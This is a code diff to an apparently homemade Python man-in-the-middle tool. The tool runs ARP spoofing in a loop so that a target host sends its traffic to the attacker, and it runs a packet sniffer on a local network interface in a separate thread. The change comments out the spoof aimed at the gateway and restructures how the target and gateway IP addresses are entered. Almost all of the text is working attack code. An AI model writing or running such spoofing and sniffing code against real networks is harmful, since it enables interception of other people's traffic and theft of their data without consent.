@@ -10,7 +10,7 @@ def doing_arp_spoofing(target_ip, target_mac, gateway_ip, gateway_mac):
         # Tell the target ip that I am the router and send the packets to me
         arp_spoofing.arp_spoof(target_ip, target_mac, gateway_ip)
         # Tell the router that I am the target ip and send his packets to me
-        arp_spoofing.arp_spoof(gateway_ip, gateway_mac, target_ip)
+        # arp_spoofing.arp_spoof(gateway_ip, gateway_mac, target_ip)
         print("spoofing")
         # Doing delay of 2 seconds
         time.sleep(2)
@@ -19,16 +19,18 @@ def doing_sniffer(interface):
     # Doing sniffer about my interface controller network
     sniffer.sniff(interface)
 
-network_prefix = input("Enter the prefix number of the target IP ( exe : '10.13.45' ) : ")
-target_network_suffix = input("Enter the suffix number of the target IP ( 1 - 255 ) : ")
-gateway_ip = "{}.138".format(network_prefix)
-target_ip = "{}.7".format(network_prefix)
-interface = "Realtek PCIe GbE Family Controller #2"
-
-# Creating thread that doing sniffer
-sniff = Thread(target=doing_sniffer, args=(interface,))
-
 if __name__ =="__main__":
+    network_prefix = input("Enter your prefix network ( exe : '10.13.45' ) : ")
+    gateway_network_suffix = input("Enter the suffix number of the gateway IP ( 1 - 255 ) : ")
+    target_network_suffix = input("Enter the suffix number of the target IP ( 1 - 255 ) : ")
+
+    gateway_ip = "{}.{}".format(network_prefix, gateway_network_suffix)
+    target_ip = "{}.{}".format(network_prefix, target_network_suffix)
+    interface = "Realtek PCIe GbE Family Controller #2"
+
+    # Creating thread that doing sniffer
+    sniff = Thread(target=doing_sniffer, args=(interface,))
+
     # Check if the target is connected
     if check_ping.check_ping(target_ip):
         # Start the sniff and arp spoofing
